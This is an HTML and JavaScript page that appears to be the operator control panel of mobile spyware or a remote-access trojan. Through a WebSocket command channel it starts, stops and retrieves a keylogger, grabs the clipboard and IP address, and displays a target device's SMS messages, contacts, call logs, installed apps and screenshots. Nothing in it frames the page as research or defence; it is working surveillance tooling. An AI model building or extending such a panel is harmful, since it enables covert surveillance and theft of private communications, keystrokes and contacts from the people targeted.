<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Panel</title>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    body {
      margin: 0;
      background: #0d0d0d;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      height: 100vh;
      overflow: hidden;
    }

    /* Sidebar */
    #sidebar {
      width: 240px;
      background: #111;
      border-right: 1px solid #222;
      display: flex;
      flex-direction: column;
      padding: 20px;
      box-sizing: border-box;
      overflow-y: auto;
    }

    #sidebar h2 {
      margin-top: 0;
      margin-bottom: 15px;
      font-size: 20px;
      color: #aaa;
    }

    .tab-btn {
      background: #1a1a1a;
      padding: 10px;
      margin-bottom: 8px;
      border-radius: 6px;
      cursor: pointer;
      transition: 0.2s;
    }

    .tab-btn:hover, .tab-btn.active {
      background: #333;
    }

    .section-title {
      margin-top: 25px;
      font-size: 14px;
      color: #777;
      margin-bottom: 10px;
    }

    /* Main Panel */
    #main {
      flex: 1;
      overflow-y: auto;
      padding: 20px;
    }

    .panel {
      display: none;
    }

    .panel.active {
      display: block;
    }

    /* Screenshot Grid */
    #screenshotGrid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
      gap: 15px;
    }

    .shot {
      width: 100%;
      border-radius: 8px;
      cursor: pointer;
      border: 1px solid #333;
      transition: 0.2s;
    }

    .shot:hover {
      transform: scale(1.02);
    }

    /* Modal */
    #imageModal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.8);
      display: none;
      justify-content: center;
      align-items: center;
    }

    #imageModal.show {
      display: flex;
    }

    #modalImage {
      max-width: 90%;
      max-height: 90%;
      border-radius: 8px;
    }

    #modalDownload {
      position: absolute;
      top: 20px;
      right: 20px;
      background: #444;
      padding: 10px 15px;
      border-radius: 5px;
      cursor: pointer;
    }

    #closeModal {
      position: absolute;
      top: 20px;
      left: 20px;
      background: #444;
      padding: 10px 15px;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>

<body>

  <!-- Sidebar -->
  <div id="sidebar">

    <h2>Device Menu</h2>

    <!-- Tabs -->
    <div class="tab-btn active" data-tab="logs">üìÑ Logs</div>
    <div class="tab-btn" data-tab="sms">üí¨ SMS</div>
    <div class="tab-btn" data-tab="contacts">üìá Contacts</div>
    <div class="tab-btn" data-tab="calls">üìû Calls</div>
    <div class="tab-btn" data-tab="apps">üì± Installed Apps</div>
    <div class="tab-btn" data-tab="screenshots">üñº Screenshots</div>

    <!-- Old required buttons -->
    <div class="section-title">Controls</div>

    <button id="btnFetchIp" class="tab-btn">üåê Fetch IP</button>
    <button id="btnFetchClip" class="tab-btn">üìã Fetch Clipboard</button>
    <button id="btnStartKeyLog" class="tab-btn">üü¢ Start Keylogger</button>
    <button id="btnStopKeyLog" class="tab-btn">üî¥ Stop Keylogger</button>
    <button id="btnFetchKeyLog" class="tab-btn">‚å® Fetch Keylogs</button>
    <button id="btnFetchLog" class="tab-btn">üìÅ Fetch Calls</button>
    <button id="btnClose" class="tab-btn">‚ùå Close Panel</button>
  </div>

  <!-- Main -->
  <div id="main">

    <div id="panelLogs" class="panel active">
      <h2>Logs</h2>
      <pre id="logsOutput">Waiting for logs...</pre>
    </div>

    <div id="panelSms" class="panel">
      <h2>SMS Messages</h2>
      <pre id="smsOutput">Waiting...</pre>
    </div>

    <div id="panelContacts" class="panel">
      <h2>Contacts</h2>
      <pre id="contactsOutput">Waiting...</pre>
    </div>

    <div id="panelCalls" class="panel">
      <h2>Call Logs</h2>
      <pre id="callsOutput">Waiting...</pre>
    </div>

    <div id="panelApps" class="panel">
      <h2>Installed Apps</h2>
      <pre id="appsOutput">Waiting...</pre>
    </div>

    <div id="panelScreenshots" class="panel">
      <h2>Screenshots</h2>
      <div id="screenshotGrid"></div>
    </div>

  </div>

  <!-- Modal -->
  <div id="imageModal">
    <button id="closeModal">Close</button>
    <button id="modalDownload">Download</button>
    <img id="modalImage">
  </div>

<script>
/* -------------------------
      WEBSOCKET HANDLER
-------------------------- */

const ws = new WebSocket("wss://your-server/ws"); // <-- your endpoint

ws.onopen = () => console.log("Connected.");
ws.onmessage = msg => handleIncoming(msg.data);
ws.onclose = () => console.log("Disconnected.");

function sendCmd(cmd) {
  ws.send(JSON.stringify({ cmd }));
}

/* -------------------------
         TAB NAVIGATION
-------------------------- */

document.querySelectorAll(".tab-btn[data-tab]").forEach(btn => {
  btn.onclick = () => {
    document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
    btn.classList.add("active");

    let tab = btn.getAttribute("data-tab");

    document.querySelectorAll(".panel").forEach(p => p.classList.remove("active"));
    document.getElementById("panel" + capitalize(tab)).classList.add("active");
  };
});

function capitalize(s) {
  return s.charAt(0).toUpperCase() + s.slice(1);
}

/* -------------------------
      OLD REQUIRED BUTTONS
-------------------------- */

document.getElementById("btnFetchIp").onclick = () => sendCmd("fetch-ip");
document.getElementById("btnFetchClip").onclick = () => sendCmd("fetch-clip");
document.getElementById("btnStartKeyLog").onclick = () => sendCmd("start_keylog");
document.getElementById("btnStopKeyLog").onclick = () => sendCmd("stop_keylog");
document.getElementById("btnFetchKeyLog").onclick = () => sendCmd("fetch_keylog");
document.getElementById("btnFetchLog").onclick = () => sendCmd("fetch-logs");
document.getElementById("btnClose").onclick = () => window.close();

/* -------------------------
        INCOMING DATA
-------------------------- */

function handleIncoming(data) {
  try {
    data = JSON.parse(data);
  } catch (e) {
    console.log("Invalid JSON", data);
    return;
  }

  switch (data.type) {

    case "logs":
      document.getElementById("logsOutput").textContent = data.payload;
      break;

    case "sms":
      document.getElementById("smsOutput").textContent = JSON.stringify(data.payload, null, 2);
      break;

    case "contacts":
      document.getElementById("contactsOutput").textContent = JSON.stringify(data.payload, null, 2);
      break;

    case "calls":
      document.getElementById("callsOutput").textContent = JSON.stringify(data.payload, null, 2);
      break;

    case "apps":
      document.getElementById("appsOutput").textContent = JSON.stringify(data.payload, null, 2);
      break;

    case "screenshot":
      addScreenshot(data.url || data.payload);
      break;
  }
}

/* -------------------------
       SCREENSHOTS PANEL
-------------------------- */

function addScreenshot(url) {
  if (!url) return;

  let isHosted =
    url.includes("supabase") ||
    url.includes("s3") ||
    url.includes("storage.googleapis");

  if (!isHosted) return;

  const grid = document.getElementById("screenshotGrid");

  let img = document.createElement("img");
  img.src = url;
  img.className = "shot";
  img.onclick = () => openModal(url);

  grid.prepend(img);
}

/* -------------------------
           MODAL
-------------------------- */

function openModal(url) {
  const modal = document.getElementById("imageModal");
  const img = document.getElementById("modalImage");
  const dl = document.getElementById("modalDownload");

  img.src = url;
  dl.onclick = () => downloadImage(url);

  modal.classList.add("show");
}

function closeModal() {
  const modal = document.getElementById("imageModal");
  document.getElementById("modalImage").src = "";
  document.getElementById("modalDownload").onclick = null;
  modal.classList.remove("show");
}

document.getElementById("closeModal").onclick = closeModal;

async function downloadImage(url) {
  const res = await fetch(url);
  const blob = await res.blob();
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "screenshot.jpg";
  a.click();
}

</script>

</body>
</html>
